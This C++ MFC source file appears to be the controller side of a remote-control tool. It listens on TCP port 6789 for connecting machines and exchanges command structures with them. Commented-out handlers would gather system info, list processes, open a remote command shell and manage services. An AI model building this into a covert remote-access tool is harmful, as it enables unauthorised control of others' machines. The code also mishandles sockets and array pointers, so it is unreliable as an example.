#include "StdAfx.h"
#include "resource.h"
#include "ClientSock.h"
#include "FireFlyDlg.h"

CArray<ServItem,ServItem&>m_ServArray;


CClientSock::CClientSock(void)
{
}


CClientSock::~CClientSock(void)
{
}

BOOL CClientSock::MySelect(SOCKET sk)
{
	fd_set fs;
	FD_ZERO(&fs);
	FD_SET(sk,&fs);
	timeval tv;
	tv.tv_sec=0;
	tv.tv_usec=1000;

	int bse=0;
	bse=select(0,&fs,0,0,&tv);
	if(bse<=0)
	{
		return FALSE;
	}
	else if(FD_ISSET(sk,&fs))
	{
		return TRUE;
	}
	return FALSE;
}

UINT CClientSock:: MyControllingFunction(LPVOID pParam)
{
	CFireFlyDlg* pThis=(CFireFlyDlg*)pParam;
	SOCKET sk=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(sk==INVALID_SOCKET)
	{
		AfxMessageBox(L"SOCKET初始化失败。");
		return 0;
	}

	sockaddr_in baddr;
	baddr.sin_family=AF_INET;
	baddr.sin_port=htons(6789);
	baddr.sin_addr.S_un.S_addr=INADDR_ANY;


	if(SOCKET_ERROR==bind(sk,(sockaddr*)&baddr,sizeof(sockaddr_in)))
	{
		AfxMessageBox(L"SOCKET初始化失败。");
		closesocket(sk);
		return 0;
	}

	if(listen(sk,SOMAXCONN)==SOCKET_ERROR)
	{
		AfxMessageBox(L"SOCKET初始化失败。");
		closesocket(sk);
		return 0;
	}

	while(TRUE)
	{
		if(pThis->m_ClientSock.MySelect(sk))
		{
			sockaddr_in acaddr;
			int iaddr_int=sizeof(sockaddr_in);
			SOCKET acsock=accept(sk,(sockaddr*)&acaddr,&iaddr_int);
			if(acsock==INVALID_SOCKET)
			{
				closesocket(acsock);
				continue;
			}
			ServItem sitem;
			sitem.sk=acsock;
			sitem.ip=inet_ntoa(acaddr.sin_addr);
			int p=-1;
			if(!pThis->m_ClientSock.PanDuan(sitem.ip,p))
			{
				continue;
			}

			int idx=m_ServArray.Add(sitem);
			AfxBeginThread(pThis->m_ClientSock.MyRecvFunction,LPVOID(&m_ServArray.GetAt(idx)));
		}
		Sleep(100);
	}

	return 0;
}


BOOL CClientSock::MySendCommand(SOCKET sk,int ID,char* buffer,int size,int fID)
{
	COMMAND cmd;
	ZeroMemory(&cmd,COMSIZE);
	cmd.ID=ID;
	if(buffer!=NULL)
	{
		memcpy(cmd.buffer,buffer,size);
	}
	cmd.fID=fID;
	char* sendbuffer=new char[COMSIZE];
	memcpy(sendbuffer,&cmd,COMSIZE);
	int nLeft=COMSIZE;
	int idx=0;
	while(nLeft>0)
	{
		int dx=send(sk,&sendbuffer[idx],nLeft,0);
		if (SOCKET_ERROR == dx)
		{
			delete[] sendbuffer;
			return FALSE;
		}
		nLeft=nLeft-dx; //剩了多少
		idx=idx+dx;		//发了多少
	}
	delete[] sendbuffer;
	return TRUE;
}
BOOL CClientSock::MyReciveCommand(SOCKET sk,COMMAND &cmd)
{
	
	ZeroMemory(&cmd,COMSIZE);
	char* recivebuffer=new char[COMSIZE];
	ZeroMemory(recivebuffer,COMSIZE);
	int nLeft=COMSIZE;
	int idx=0;
	while(nLeft>0)
	{
		int dx=recv(sk,&recivebuffer[idx],nLeft,0);
		if (SOCKET_ERROR == dx)
		{
			delete[] recivebuffer;
			return FALSE;
		}
		nLeft=nLeft-dx; //剩了多少
		idx=idx+dx;		//发了多少
	}
	memcpy(&cmd,recivebuffer,COMSIZE);
	delete[] recivebuffer;
	return TRUE;
}

UINT __cdecl CClientSock::MyRecvFunction( LPVOID pParam )
{
	//ServItem sitem = *(ServItem*)pParam;
	//CMainFrame *pFram = (CMainFrame*)AfxGetApp()->m_pMainWnd;
	//CHeiHuClientView *pView = (CHeiHuClientView*)pFram->GetActiveView();

	//pView->m_ClientSock.MySendCommand(sitem.sk,MYGETSYSINFO,NULL,0);
	//while (1)
	//{
	//	int idx=-1;
	//	if (pView->m_ClientSock.MySelect(sitem.sk))
	//	{
	//		COMMAND command;
	//		ZeroMemory(&command,COMSIZE);            
	//		if (!pView->m_ClientSock.MyReciveCommand(sitem.sk,command))
	//		{
	//			pView->m_ClientSock.PanDuan(sitem.ip,idx);
	//			pView->SendMessage(WM_OFFLINE,0,(LPARAM)idx);
	//			return 0;
	//		}			

	//		switch (command.ID)
	//		{
	//		case MYGETSYSINFO:
	//	//		AfxMessageBox(_T("我是clientMYGETSYSINFO"));
	//			pView->m_ClientSock.PanDuan(sitem.ip,idx);
	//			SYSINFO info;
	//			memcpy(&info,&command.buffer,sizeof(SYSINFO));
	//			m_ServArray.GetAt(idx).cmpname = info.cmpname;
	//			m_ServArray.GetAt(idx).memsize = info.memsize;
	//			m_ServArray.GetAt(idx).os = info.os;
	//			pView->SendMessage(WM_ONLINE,(WPARAM)&m_ServArray.GetAt(idx),(LPARAM)idx);
	//			break;
	//		case MYGETPROCESS:
	//			pView->m_Process->ProcessComment(command);
	//			break;
	//		case MYCMDSHELL:
	//			pView->m_CmdShell->CmdCommand(command);
	//			break;
	//		case MYSVCMANAGE:
	//			pView->m_SvcManage->MySVCCommand(command);
	//			break;
	//		default:
	//			break;
	//		}
	//	}
	//}


	return 0;
}


bool CClientSock::PanDuan(CString ip, int& idx)
{
	for(int i=0;i<m_ServArray.GetCount();i++)
	{
		if(ip==m_ServArray.GetAt(i).ip)
		{
			idx=i;
			return false;
		}
	}
	return true;
}
